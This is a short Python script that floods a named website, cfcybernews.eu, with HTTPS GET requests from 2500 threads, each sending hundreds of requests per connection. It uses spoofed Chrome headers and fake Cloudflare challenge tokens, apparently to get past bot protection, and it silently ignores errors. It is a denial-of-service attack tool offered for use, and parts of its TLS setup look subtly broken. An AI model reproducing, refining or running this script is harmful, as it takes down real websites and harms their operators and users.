import socket,ssl,threading,time,random,string

hostname = 'cfcybernews.eu'
port = 443

def pktsend():
 for _ in range(250):
  try:
   s = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23).wrap_socket(socket.create_connection((hostname,port)),server_hostname=hostname)
   s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
   s.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0x10)
   headers = [
    'Sec-Ch-Ua:"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','Sec-Ch-Ua-Arch:"x86"','Sec-Ch-Ua-Bitness: "64"','Sec-Ch-Ua-Form-factors: "Desktop"','Sec-Ch-Ua-Full-version:"134.0.6998.89"','Sec-Ch-Ua-Full-version-list:"Chromium";v="134.0.6998.89", "Not:A-Brand";v="24.0.0.0", "Google Chrome";v="134.0.6998.89"','Sec-Ch-Ua-Mobile:?0','Sec-Ch-Ua-Model: ""','Sec-Ch-Ua-Platform: "Windows"','Sec-Ch-Ua-Platform-version:"19.0.0"',"Sec-Ch-Ua-Wow64: ?0","Sec-Fetch-Dest: document","Sec-Fetch-Mode: navigate","Sec-Fetch-Site: none","Sec-Fetch-User: ?1",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    f"Origin: https://{hostname}/",f"Referer: https://{hostname}/?Time={time.time()}","Accept: */*","Accept-Language: *","Accept-Encoding: *","Cache-Control: max-age=0, min-fresh, max-stale, no-store, no-cache, no-transform, only-if-cached","Connection: Keep-Alive","Keep-Alive: timeout=65536, max=0","Upgrade-Insecure-Requests: 1"]
   random.shuffle(headers)
   pkt = f'GET /?Time={time.time()}&?__cf_chl_rt_tk={''.join([random.choice((string.ascii_letters+string.digits+'_')) for _ in range(43)])}-{int(time.time())}-1.0.1.1-{''.join([random.choice((string.ascii_letters+string.digits+'_.')) for _ in range(43)])} HTTP/1.1\r\nHost: {hostname}\r\n{"\r\n".join(headers)}\r\n\r\n'.encode()
   for _ in range(500):
    s.write(pkt)
  except:pass

[threading.Thread(target=pktsend).start() for _ in range(2500)]